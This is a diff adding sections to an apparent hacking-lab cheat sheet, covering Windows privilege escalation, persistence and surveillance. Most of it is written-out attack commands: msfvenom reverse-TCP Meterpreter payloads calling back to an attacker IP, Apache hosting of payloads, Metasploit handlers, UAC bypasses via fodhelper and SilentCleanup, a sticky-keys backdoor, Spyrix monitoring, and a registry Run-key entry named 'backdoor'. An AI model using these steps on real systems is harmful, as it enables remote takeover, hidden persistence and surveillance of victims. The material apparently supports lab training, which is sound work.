@@ -758,3 +758,105 @@ and in script folder path
 chmod +x shellcode.py
 ./shellcode.py
 ```
+</details>
+<details>
+
+## Perform Privilege Escalation to Gain Higher Privileges 
+<summary>Escalate privileges by bypassing UAC and exploiting Sticky Keys</summary>
+
+* create a payload
+```console
+~$: msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe.
+
+```
+* create a folder in localhost in var directory
+```console
+~$: var >> mkdir share
+Run chmod -R 755 /var/www/html/share command
+Run chown -R www-data:www-data /var/www/html/share command
+```
+* Copy the payload into the shared folder by executing
+```console
+~$:cp /home/attacker/Desktop/Windows.exe /var/www/html/share/
+
+
+Start the Apache server by executing service apache2 start command.
+```
+* Run metasploit
+```console
+~$: msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST<>
+set LPORT <>
+
+
+run the payload in victim machine
+```
+* now we will bypass the UAC by "FodHelper"
+```console
+~$:use exploit/windows/local/bypassuac_fodhelper
+set session 1
+set TARGET = 0
+exploit
+```
+
+```console
+~$: getsystem -t 1 and press Enter to elevate privileges.
+```
+* now using sticky keys module
+```console
+~$: post/windows/manage/sticky_keys
+set session 2
+exploit
+proceed to mark user account and in lock screen hit sticky key 5 times 
+whoami
+```
+</details>
+<details>
+<summary>Maintain Remote Access and Hide Malicious Activities</summary>
+
+* User System Monitoring and Surveillance using Spyrix
+```console
+~$:Spyrix (GUI)
+```
+<summary> Maintain Persistence by Modifying Registry Run Keys</summary>
+
+* create a payload
+```console
+~$: msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Test.exe
+```
+>payload that needs to be uploaded into the Run Registry of Windows 11
+```console
+~$:msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=4444 -f exe > /home/attacker/Desktop/registry.exe
+
+cp /home/attacker/Desktop/Test.exe /var/www/html/share/ and cp /home/attacker/Desktop/registry.exe /var/www/html/share/
+
+start the apache2
+```
+>run metasploit
+```console
+~$: msfconsole
+set payload windows/meterpreter/reverse_tcp
+set lhost and lport
+```
+* Windows UAC protection evading
+```console
+~$: Windows UAC protection via SilentCleanup task present in Windows Task Scheduler. It is present in Metasploit as a bypassuac_silentcleanup exploit.
+
+use exploit/windows/local/bypassuac_silentcleanup
+set session 1
+set TARGET 0
+exploit
+getsystem -t 1 (escalate previlage)
+```
+>to ingect malicious file
+```console
+~$:reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_EXPAND_SZ /d "C:\Users\Admin\Downloads\registry.exe"
+
+msfconsole in another cmd
+ use exploit/multi/handler
+ set payload windows/meterpreter/reverse_tcp
+ set lport and lhost the same which is given to registry payload
+ restart the victim machine
+ 
